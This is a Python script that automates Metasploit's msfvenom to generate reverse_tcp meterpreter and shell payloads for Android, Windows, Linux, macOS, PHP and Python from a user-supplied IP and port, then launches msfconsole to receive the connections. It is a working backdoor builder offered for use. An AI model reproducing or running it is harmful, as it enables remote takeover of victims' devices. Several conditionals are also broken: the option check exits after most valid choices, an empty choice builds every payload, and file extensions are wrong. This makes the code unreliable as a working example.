#!/usr/bin/python3
#coded by Sayuk Beast

import os
from time import sleep
from sys import exit

space = " " * 66
cya = "Bye Hope See you again :)."
nopt = "[!]Sorry No Such of option"
green = "\033[1;32;40m"
red = "\033[1;31;40m"
black = "\033[1;30;40m"
yellow = "\033[1;33;40m"
blue = "\033[1;34;40m"
purple = "\033[1;35;40m"
cyan = "\033[1;36;40m"
white = "\033[1;37;40m"
normal = "\033[0m"

def logo():
    os.system("clear")
    print("\033[1;32;40m ____                    _    ____                 _")
    sleep(0.1)
    print("/ ___|  __ _ _   _ _   _| | _| __ )  ___  __ _ ___| |_")
    sleep(0.1)
    print("\___ \ / _` | | | | | | | |/ /  _ \ / _ \/ _` / __| __|")
    sleep(0.1)
    print(" ___) | (_| | |_| | |_| |   <| |_) |  __/ (_| \__ \ |_")
    sleep(0.1)
    print("|____/ \__,_|\__, |\__,_|_|\_\____/ \___|\__,_|___/\__|")
    sleep(0.1)
    print("             |___/")
    sleep(0.1)
    print("Tool created by Sayuk Beast")
    print(space)
    print("\033[1;31;40m Do not copy this code without my permission")
    print("Please appreciate my hard work")
    print(space)
def start():
    import os
    start = input("\033[1;33;40m [?]Do you want to start? Y/n > ")
    start = start.lower()
    print()
    if not start == "y" or start == "":
       print(cya)
       sleep(1)
       os.system("clear")
       exit()
    if start == "y" or start == "":
       ask = input("[?]Did already created Payload? Y/n > ")
       if ask == "y" or ask == "":
          yus = input("Do you want to start Metasploit? Y/n > ")
          if yus == "y" or yus == "":
             os.system("msfconsole")
          if not yus == "y":
             print(cya)
             sleep(1)
             os.system("clear")
             exit()
       if not ask == "y" or ask == "":
          print(space)
          import os
          ip = input("[?]What's your ip? > ")
          ip = ip.lower()
          print()
          port = input("[?]How about your port? > ")
          port = port.lower()
          print(space)
          name = input("[?]What would you name your payload? >")
          print(space)
          print("[?]What kind of payload do you want to create?")
          print(blue+"|||||||||||||")
          print(blue+"||\033[1;32;40m1=Android\033[1;34;40m||")
          print(blue+"|||||||||||||")
          print(blue+"||\033[1;32;40m2=Windows\033[1;34;40m||")
          print(blue+"|||||||||||||")
          print(blue+"||\033[1;32;40m3=Linux  \033[1;34;40m||")
          print(blue+"|||||||||||||")
          print(blue+"||\033[1;32;40m4=Mac    \033[1;34;40m||")
          print(blue+"|||||||||||||")
          print(blue+"||\033[1;32;40m5=PHP    \033[1;34;40m||")
          print(blue+"|||||||||||||")
          print(blue+"||\033[1;32;40m6=Python \033[1;34;40m||")
          print(blue+"|||||||||||||")
          choose = input(yellow+"Choose Your option > ")
          if choose == "1" or choose == "":
             print("Generating your payload...")
             os.system("msfvenom -p android/meterpreter/reverse_tcp lhost="+ip+" lport="+port+" -o "+name+".apk")
             print("Payload Created and named as",name)
          if choose == "2" or choose == "":
             print("Generating your payload...")
             os.system("msfvenom -p windows/meterpreter/reverse_tcp lhost="+ip+" lport="+port+" -o "+name+".exe")
             print("Payload Created and named as",name)
          if choose == "3" or choose == "":
             print("Generating your payload...")
             os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp lhost="+ip+" lport="+port+" -o "+name+".elf")
             print("Payload Created and named as",name)
          if choose == "4" or choose == "":
             print("Generating your payload...")
             os.system("msfvenom -p osx/x86/shell_reverse_tcp lhost="+ip+" lport="+port+" -o "+name+".macho")
             print("Payload Created and named as",name)
          if choose == "5" or choose == "":
             print("Generating your payload...")
             os.system("msfvenom -p php/meterpreter/reverse_tcp lhost="+ip+" lport="+port+" -o "+name+"php")
             print("Payload Created and named as",name)
             print(space)
          if choose == "6":
             os.system("msfvenom -p python/meterpreter/reverse_tcp lhost="+ip+" lport="+port+" -o "+name+".php")
          if not choose == "1" or choose == "2" or choose == "3" or choose == "4" or choose == "5" or choose == "6":
             print(red+nopt)
             sleep(1)
             os.system("clear")
             exit()
          msf = input("\033[1;33;40m[?]Start metasploit? Y/n > ")
          msf = msf.lower()
          if msf == "y" or msf == "":
             print("Starting Metasploit...")
             os.system("msfconsole")
             print("Metasploit Closed")

try:
   logo()
   start()
except KeyboardInterrupt:
   print(cya)
   print("Please Wait...")
   sleep(1)
   print(cya)
   os.system("clear")
   exit()
